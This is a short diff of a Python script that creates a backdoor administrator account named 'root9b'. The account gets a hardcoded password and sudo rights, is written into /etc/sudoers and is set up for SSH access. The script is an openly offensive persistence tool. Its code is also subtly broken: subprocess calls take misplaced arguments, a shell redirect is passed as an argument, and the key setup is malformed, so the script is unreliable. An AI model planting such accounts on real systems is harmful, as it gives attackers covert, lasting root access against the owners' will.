@@ -5,19 +5,21 @@
 
 import subprocess
 
+
 def addsudoer():
-    subprocess.check_output(['/usr/sbin/useradd', '-m', # create home dir (for .ssh folder)
-                             '-G', 'sudo',              # group
-                             '-p', '9btoor',            # pass
-                             'root9b',                  # user
-                             '-s', '/bin/bash'])        # set shell to bash
-    subprocess.check_output('echo', '"root9b    ALL=(ALL:ALL) ALL"', ' >> ', '/etc/sudoers') # just in case
+    subprocess.check_output('/usr/sbin/useradd', '-m',  # create home dir (for .ssh folder)
+                            '-G', 'sudo',               # group
+                            '-p', '9btoor',             # pass
+                            'root9b',                   # user
+                            '-s', '/bin/bash')          # set shell to bash
+    subprocess.check_output('echo', '\"root9b    ALL=(ALL:ALL) ALL\"', ' >> ', '/etc/sudoers')  # just in case
+
 
 def add_sshuser():
     subprocess.check_output('mkdir','/home/root9b/.ssh')
     subprocess.check_output('chmod', '700','/home/root9b/.ssh')
     subprocess.check_output('touch', '/home/root9b/.ssh/authorized_keys')
-    subprocess.check_output('ssh-keygen','-t','rsa', '-f','/home/root9b/.ssh/authorized_keys' -'N',"''")
+    subprocess.check_output('ssh-keygen','-t','rsa', '-f','/home/root9b/.ssh/authorized_keys', -'N',"\'\'")
 
 
 addsudoer()
